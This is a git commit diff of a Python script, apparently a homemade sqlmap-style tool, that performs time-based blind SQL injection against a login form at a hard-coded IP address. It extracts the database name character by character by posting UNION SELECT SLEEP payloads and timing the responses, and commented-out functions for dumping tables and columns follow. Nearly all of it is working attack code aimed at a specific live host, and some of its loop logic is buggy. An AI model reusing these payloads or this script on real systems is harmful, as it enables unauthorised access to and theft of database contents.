08769436400a43c598f634583ab00b244dd3b8d7
quentin-csg <qcassaigne73@gmail.com>
2023-03-08 10:54:54 -0500

    sqlmap_version_nul_edit.py

--- code_attente/sqlmap_version_nul_edit.py
+++ code_attente/sqlmap_version_nul_edit.py
@@ -1,46 +1,52 @@
 import requests
 import time
 
-dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
-def get_db_names(url):
+def nom_user_db():
+    dictionary = "abcdefghijklmnopqrstuvwxyz_"
     a=0
     db_names = []
-    response.text = []
-    TIME = (5)
-    for i in range(1, 10):
+    texte = ""
+    TIME = 5
+    url = "http://51.15.136.118/pageid.php"
+    for i in range(1, 99):
         for j in range(0, len(dictionary)):
-            """query = "' UNION SELECT 1,2,3,4,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 0,1 OFFSET {} --".format(i)
-            payload = "' AND IF(MID((select count(*) from (%s) as totalCount),%s,1)='%s',SLEEP(%s),0)--+" % (query, str(j), quote(dictionary[j]), str(TIME))"""
-            payload = "SELECT * FROM users WHERE username = 'test' AND password = 'test' UNION SELECT SLEEP(TIME),1,2 where database() like '[response.text]%';--'"
+            usr = "idc"
+            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
+            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
+            print(passwd)
             start_time = time.time()
-            response = requests.post(url+payload)
+            response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
-        if total_time > TIME:
-            response.text.append(dictionary[j])
-        a += 1
-        if a == 95:
-            db_names.append(response.text)
-            response.txt.clear()
-    print(db_names)
-    return db_names
+            """print(total_time)
+            print(dictionary[j])"""
+            a += 1
+            if a >= 28:
+                exit()
+            if total_time >= TIME:
+                texte += dictionary[j]
+                print(texte)
+                i += 1
+                j = 0
+                a = 0
+                break
+    return texte
 
+nom_user_db()
 
+"""
 url = 'http://51.15.136.118/pageid.php'
 db_names = get_db_names(url)
 print(db_names)
 
-"""for db_name in db_names:
+
+for db_name in db_names:
     tables = get_tables(url, db_name)
     for table in tables:
         columns = get_columns(url, db_name, table)
         print("Table: {}, Columns: {}".format(table, columns))
-"""
 
-
-
-""""
-
+        
 def get_tables(url, db_name):
     tables = []
     for i in range(1, 20):
@@ -53,6 +59,7 @@ def get_tables(url, db_name):
             tables.append(response.text)
     return tables
 
+    
 def get_columns(url, db_name, table_name):
     columns = []
     for i in range(1, 20):
